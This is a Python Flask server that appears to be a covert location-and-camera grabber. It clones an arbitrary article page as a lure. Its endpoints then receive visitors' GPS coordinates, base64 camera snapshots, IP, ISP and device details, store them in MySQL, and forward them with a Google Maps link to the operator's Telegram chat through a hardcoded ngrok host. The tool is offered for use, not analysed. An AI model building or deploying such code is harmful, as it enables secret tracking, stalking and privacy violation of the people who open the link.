from flask import Flask, render_template
from dotenv import load_dotenv
from bs4 import BeautifulSoup as bs
import logging, base64, time
from flask import request
from flask_cors import CORS
import mysql.connector
import datetime
import os, requests as r
from urllib.parse import urlparse
from telegram import ParseMode
import requests
import json
from dotenv import load_dotenv

load_dotenv()

log = logging.getLogger('werkzeug')
load_dotenv()

os.system("clear" if os.name == 'posix' else 'cls')
token = os.getenv('TOKEN') #ISI TOKEN BOT

last_insert_id = ""
app = Flask(__name__)
CORS(app)
app.config['PROPAGATE_EXCEPTIONS'] = True
app.config['SECRET_KEY'] = os.urandom(32)
conn = mysql.connector.connect(
    host='localhost',
    port='3306',
    user=os.getenv('MYSQL_USER'),
    password=os.getenv('MYSQL_PASS'),
    database=os.getenv('MYSQL_DB')
)
URL = os.getenv('URL')

# PRE PREPERATION
def install_tb():
    cur = conn.cursor()

    # MySQL syntax to create the 'log' table
    create_table_query = """
    CREATE TABLE IF NOT EXISTS `log` (
    `id` int NOT NULL AUTO_INCREMENT,
    `image` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
    `lat` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
    `long` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
    `created_at` timestamp NOT NULL ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (`id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
    """

    try:
        # Execute the create table query
        cur.execute(create_table_query)
        print("Table 'log' created successfully!")
    except mysql.connector.Error as error:
        print(f"Error creating table: {error}")

    # Close the cursor and connection
    cur.close()
    # conn.close()
    
def get_hostname_and_tld(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    tld = '.'.join(hostname.split('.')[-2:])  # Extract the last two components as TLD
    return tld

def textTemplate(log_user, json_data):
    print(json_data)
    ipAddress = json_data['dataip']['ip'];
    isp = json_data['dataip']['data_asn']['name'];
    browser = json_data['dataua']['client']['name'];
    engine = json_data['dataua']['client']['engine'];
    strOs = json_data['dataua']['os']['name'] + ' ' +json_data['dataua']['os']['version'];
    device = json_data['dataua']['device']['type'];
    
    return """
*IP Address:*{ipaddr}
*ISP:*{isp}
*Browser:*{browser}
*Engine:*{engine}
*OS:*{str_os}
*Device:*{device}
*Lokasi Map:* https://www.google.co.id/maps/place/{lat},{long}
*Foto:*{foto}
""".format(
        lat=log_user[3], 
        long=log_user[4], 
        foto=URL+"/"+log_user[2],
        ipaddr=ipAddress,
        isp=isp,
        browser=browser,
        engine=engine,
        str_os=strOs,
        device=device
    )

def telegram_bot_sendtext(chat_id, bot_message):

    bot_token = ''
    bot_chatID = ''
    send_text = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + str(chat_id) + '&parse_mode=Markdown&text=' + bot_message

    response = requests.get(send_text)

    return response.json()
install_tb()

# url = input("Domain? (ngrok or live domain):");
url = "https://a0a0-125-166-59-83.ngrok-free.app/"

@app.get('/')
def index():
    global url
    article = request.args.get("article")
    user_id = request.args.get("userId") if request.args.get("userId") is not None else "Unknown"
    
    cur = conn.cursor()
    cur.execute("SELECT * FROM `urls` WHERE `url` = %s and user_id = %s;", [article, user_id])
    result = cur.fetchone()
    conn.commit()
    cur.close()

    if result is None:
        return render_template('404.html')

    tld = ""
    html = "<h1>This website is cool</h1>"
    meta_title = ""
    meta_desc = ""
    meta_image = ""
    
    if result[4] != "":
        meta_title = result[4]

    if result[5] != "":
        meta_desc = result[5]
    
    if result[6] != "":
        meta_image = result[6]
    
    if article is not None:
        html = r.get(article).text
        tld = get_hostname_and_tld(article).title()
    
    return render_template('index.html', url=url, tld=tld, html=html, meta_title=meta_title, meta_desc=meta_desc, meta_image=meta_image)

@app.route('/location', methods = ['POST'])
def location():
    global last_insert_id
    lat = request.form["lat"]
    long = request.form["long"]
    url = request.form["url"]
    accuracy = request.form["accuracy"]
    
    # log to DB
    cur = conn.cursor()
    cur.execute("SELECT * FROM `urls` WHERE `url` = %s;", [url])
    get_url = cur.fetchone()
    url_id = get_url[0]
    
    cur.execute("INSERT INTO log (url_id, lat, `long`,`accuracy`, created_at) VALUES (%s, %s, %s, %s, %s)", [
        url_id,
        lat,
        long,
        accuracy,
        datetime.datetime.now()
    ])
    conn.commit()
    last_insert_id = cur.lastrowid
    cur.close()
    
    print("[!] Location :", f'Latitude:{lat}, Longitude: {long}')
    return {
        "message": "OK",
    }

@app.route('/image', methods = ['POST'])
def image():
    global last_insert_id
    image_bytes = request.form["image"].split(',')[1].encode()
    user_id = request.form["user_id"]
    url = request.form["url"]
    
    image = base64.b64decode(image_bytes)
    file_path = f"static/{int(time.time())}.jpg"
    open(file_path, 'wb').write(image)
    print(f"[!] Image : http://127.0.0.1:5000/{file_path}")
    
    cur = conn.cursor()
    cur.execute("UPDATE log SET image = %s WHERE id = %s", [file_path, last_insert_id])
    conn.commit()
    cur.close()
    
    cur = conn.cursor(buffered=True)
    cur.execute("SELECT * FROM `urls` WHERE `url` = %s and `user_id` = %s;", [url, user_id])
    data_url = cur.fetchone()
    
    cur.execute("SELECT * FROM `log` WHERE `url_id` = %s order by id desc;", [data_url[0]])
    log_user = cur.fetchone()
    
    cur.execute("SELECT * FROM `visitors` WHERE `url_id` = %s order by id desc;", [data_url[0]])
    visitor = cur.fetchone()
    
    json_data = []
    if (visitor is not None):
        json_data = json.loads(visitor[2])
    cur.close()
    
    telegram_bot_sendtext(data_url[2], textTemplate(log_user, json_data))
    
    return {
        "message": "OK",
    }

@app.route('/visitor', methods = ['POST'])
def visitor():
    global last_insert_id
    
    user_id = request.form["user_id"]
    url = request.form["url"]
    json = request.form["json"]
    
    cur = conn.cursor()
    cur.execute("SELECT * FROM `urls` WHERE `url` = %s and `user_id` = %s;", [url, user_id])
    data_url = cur.fetchone()
    
    cur = conn.cursor()
    cur.execute("INSERT INTO `visitors` (`url_id`, `json`, `created_at`) VALUES (%s, %s, %s);", [data_url[0], json, datetime.datetime.now()])
    conn.commit()
    cur.close()
    
    return {
        "message": "OK",
    }

if __name__ == '__main__':
    print("\n[+] Server listening in port 5000")
    app.run(host = '0.0.0.0', port = 5000, debug = os.environ.get('DEBUG', 'False') == 'True')